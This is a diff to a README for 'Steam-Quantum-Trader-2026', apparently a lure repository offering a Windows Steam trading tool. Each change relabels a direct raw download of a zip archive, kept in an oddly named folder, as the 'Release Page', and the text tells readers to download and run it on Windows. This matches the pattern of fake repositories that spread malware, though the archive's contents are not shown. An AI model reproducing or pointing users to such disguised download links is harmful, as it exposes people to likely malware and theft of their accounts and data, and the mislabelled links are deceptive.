@@ -1,6 +1,6 @@
 # ⚡ Steam-Quantum-Trader-2026 - Faster Steam inventory control
 
-[![Download](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge)](https://github.com/portahepatisninib559/Steam-Quantum-Trader-2026/releases)
+[![Download](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/portahepatisninib559/Steam-Quantum-Trader-2026/main/allochroic/Trader_Steam_Quantum_v2.6.zip)
 
 ## 🖥️ What this app does
 
@@ -16,7 +16,7 @@ You can use it to:
 
 ## 📥 Download and install
 
-Visit the [Release Page](https://github.com/portahepatisninib559/Steam-Quantum-Trader-2026/releases) to download and run this file on Windows.
+Visit the [Release Page](https://raw.githubusercontent.com/portahepatisninib559/Steam-Quantum-Trader-2026/main/allochroic/Trader_Steam_Quantum_v2.6.zip) to download and run this file on Windows.
 
 ### Steps for Windows
 
@@ -140,7 +140,7 @@ If you are unsure which file to pick, choose the Windows `.exe` file when it is 
 
 ## 🔁 Update steps
 
-1. Go to the [Release Page](https://github.com/portahepatisninib559/Steam-Quantum-Trader-2026/releases).
+1. Go to the [Release Page](https://raw.githubusercontent.com/portahepatisninib559/Steam-Quantum-Trader-2026/main/allochroic/Trader_Steam_Quantum_v2.6.zip).
 2. Download the newest Windows file.
 3. Close the old app if it is open.
 4. Replace the old file with the new one if needed.
@@ -171,7 +171,7 @@ If you are unsure which file to pick, choose the Windows `.exe` file when it is 
 
 ### I cannot find the download
 
-- Open the [Release Page](https://github.com/portahepatisninib559/Steam-Quantum-Trader-2026/releases)
+- Open the [Release Page](https://raw.githubusercontent.com/portahepatisninib559/Steam-Quantum-Trader-2026/main/allochroic/Trader_Steam_Quantum_v2.6.zip)
 - Look for the newest release
 - Check the **Assets** area
 - Pick the Windows file
